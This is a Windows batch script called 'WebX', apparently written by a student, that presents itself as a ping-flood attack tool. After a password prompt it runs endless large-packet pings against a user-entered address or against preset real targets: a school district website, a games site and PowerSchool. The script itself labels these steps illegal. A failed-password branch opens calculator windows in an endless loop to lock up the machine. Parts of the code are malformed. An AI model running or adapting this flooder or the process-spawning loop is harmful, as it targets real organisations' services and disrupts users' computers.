@echo off
set Add= 1
mode con: cols=110 lines=33
set end= 0
set Attempts= 3
Title WebX
color 0a
:Start
if %Attempts%==0 (
	goto :GB
	)
cls
echo.
echo                                        .+shmMMMMMMMMMNmhy/`                                        
echo                                        :NMMMMMMMMMMMMMMMMMMm.                                       
echo                                        mMMmdmNMMMMMMMMNddmMMd                                       
echo                                       -Mmhho:.-+NMMN+-.:ohhmM.                                      
echo                                       +MMMMMMd+:NMMd:odMMMMMM-                                      
echo                   `o                  sMd+-.-/y++MMmms/-.-+mM+                  :                   
echo                    dh.                sNsyyhhhdo-MMMMddmdddmm/                .ho                   
echo                    .NNo`              .mMMMMMMM:-MMMMMMMMMMMM-              `oNd                    
echo                     -NMN+              +sdddmd+`:MMMmNMNNNmy+              /mMd`                    
echo                      .dMMd:            :o+/mMdy+sMMMMNMNh-oo`            .hMMh`                     
echo                       `sMMMd-           :h/:-/o:.y+-syo::oy:           `sMMMy                       
echo                         :NMMMh-          -d:ohhsymdooyhNsy-          .sNMMN+                        
echo                          `sMMMMh/`        `h:dNNh++NMMNhy`         :hMMMMh.                         
echo                            .yMMMMNy-        +dMMy .MMMNo        -sNMMMMy-                           
echo                              -yMMMMMm+`      -dM+``NMh-      .+dMMMMNs.                             
echo                                `omMMMmmy:      :/ .o-     `+dMMMMMm+`                               
echo                                   /hMMhsymy:           .+hhooNMms-                                  
echo                              ..     `/hMNyssdy+-   -ohdyoohMNs-                                     
echo                             oNMo       `/yNNhssyddsoo-/dMdo-       :so.                             
echo                              `yN-   `.:/oyysohNNhssshmdso:.       sMN+.                             
echo                       ohs-////-yMh+shdhysssshdy+/sdMmhysshmMmhs:`sMd`     `                         
echo                     `NMN-dNNmm+-mMd-ydddys+:.`     -/oyddho+-:hMNo/yyhhy:MN:                       
echo                       `::/`      oMd`                      .-:`NM:`+++oo:sMm:                       
echo                                   +mNysy:                `:-./dMs       :-                          
echo                                    .//:                 `ohhy+.                                    
                                                        
echo Attempts Left: %Attempts%      
echo                                          ENTER PASSWORD:
set/p "pass=> "
if NOT %pass%==LibertyKeys goto :FAIL

cls
echo -------------------------------------------------------------------------------------
echo " 		   	                                                          "
echo "			                                                          "
echo "			                                                          "
echo "		                                 				  "
echo "			                  					  "
echo " 			           						  "
echo "                                    					 	  "
echo -------------------------------------------------------------------------------------
timeout 1 >nul
cls
echo -------------------------------------------------------------------------------------
echo " 		   	    _    _                                               "
echo "			   | |  | |                                              "
echo "			   | |  | |                                              "
echo "		           | |/\| |               				 "
echo "			   \  /\  /      					 "
echo " 			    \/  \/   						 "
echo "                                    					 	 "
echo -------------------------------------------------------------------------------------
timeout 1 >nul
cls
echo -------------------------------------------------------------------------------------
echo " 		   	    _    _        					 "               
echo "			   | |  | |      					 "     
echo "			   | |  | | ___   				         " 
echo "		           | |/\| |/ _ \    				         "
echo "			   \  /\  /  __/   				         "    
echo "			    \/  \/ \___|   				         "
echo "                                    				        	 "
echo -------------------------------------------------------------------------------------
timeout 1 >nul
cls
echo -------------------------------------------------------------------------------------
echo "		   	    _    _      _     					 "        
echo "			   | |  | |    | |          				 "
echo "			   | |  | | ___| |__    				 "
echo "		           | |/\| |/ _ \ '_ \  					 "
echo "			   \  /\  /  __/ |_) |      				 "
echo "			    \/  \/ \___|_.__/ 					 "
echo "                                    						 "
echo -------------------------------------------------------------------------------------
timeout 1 >nul
cls
echo -------------------------------------------------------------------------------------
echo "		   	    _    _      _                                        "
echo "			   | |  | |    | |                       		 "
echo "			   | |  | | ___| |__    ______  		         "
echo "		           | |/\| |/ _ \ '_ \  |______|  			 "
echo "			   \  /\  /  __/ |_) |          			 "
echo "			    \/  \/ \___|_.__/           			 "
echo "                                  					 	 "
echo -------------------------------------------------------------------------------------
timeout 1 >nul
cls
echo -------------------------------------------------------------------------------------
echo "		   	    _    _      _               __   __                  "
echo "			   | |  | |    | |              \ \ / /			 "
echo "			   | |  | | ___| |__    ______   \ V / 		         "
echo "		           | |/\| |/ _ \ '_ \  |______|  /   \ 			 "
echo "			   \  /\  /  __/ |_) |          / /^\ \			 "
echo "			    \/  \/ \___|_.__/           \/   \/			 "
echo "                                  					 	 "
echo -------------------------------------------------------------------------------------
timeout 2 >nul
:After
cls
echo -------------------------------------------------------------------------------------
echo Made by Harrison McCarty
echo -------------------------------------------------------------------------------------
timeout 1 >nul
echo Presets: 
echo BHS Website [1]
echo Cool Math [2]
echo Power School [3] 
echo Networks of specific people coming soon...
echo -------------------------------------------------------------------------------------
set input=
set /p input= Address:


if %input%==goto A if NOT B
if %input%==1 (
	goto :Preset1
	) 
else if %input%==2 (
	goto :Preset2
	)
else if %input%==3 (
	goto :Preset3
	)

:Return
cls
echo -------------------------------------------------------------------------------------
echo Interpreting your Request...
echo -------------------------------------------------------------------------------------
timeout 1 >nul
echo Loading your Request...
echo -------------------------------------------------------------------------------------
timeout 1 >nul 

echo CTRL-C TO END PING
echo -------------------------------------------------------------------------------------
ping localhost>nul
cls
echo -------------------------------------------------------------------------------------
echo Pinging Requested Address...
echo -------------------------------------------------------------------------------------
timeout 1 >nul
echo Warning: The Following Steps are Illegal.
echo ------------------------------------------------------------------------------------
timeout 1 >nul
echo Note: Max is 65,000 bytes.
set /p byte= "Enter desired output of bytes:"
goto Pinged 
ping %input% -t -l %byte%


:FAIL
set /a Attempts= %Attempts%-%Add%
goto :Start

:Kill
exit

:Pinged
ping %input% -t -l %byte%
goto Pinge
goto Pings
goto Pingea
goto Pingsa
goto Pinges

:Pinge
ping %input% -t -l %byte%
goto Pinged
goto Pings
goto Pinges
goto Pingea
goto Pingsa

:Pings
ping %input% -t -l %byte%
goto Pinge
goto Pinged
goto Pinges
goto Pingea
goto Pingsa

:Pinges
ping %input% -t -l %byte%
goto Pinge
goto Pings
goto Pingea
goto Pingsa
goto Pinged

:Pingea
ping %input% -t -l %byte%
goto Pinged
goto Pings
goto Pinge
goto Pinges
goto Pingsa

:Pingsa
ping %input% -t -l %byte%
goto Pinge
goto Pinged
goto Pingea
goto Pings
goto Pinges

:GB
cls
echo Max Attempts Reached!
timeout 2 >nul 
echo Cancer Will Begin!
timeout 3 >nul
goto :CancerStage1

:CancerStage1
start calc.exe
goto :CancerStage2

:CancerStage2
start calc.exe
goto :CancerStage1

:Preset1 
set input=www.brownsburg.k12.in.us
goto :Return

:Preset2
set input=www.coolmath-games.com
goto :Return

:Preset3
set input=www.powerschool.com
goto :Return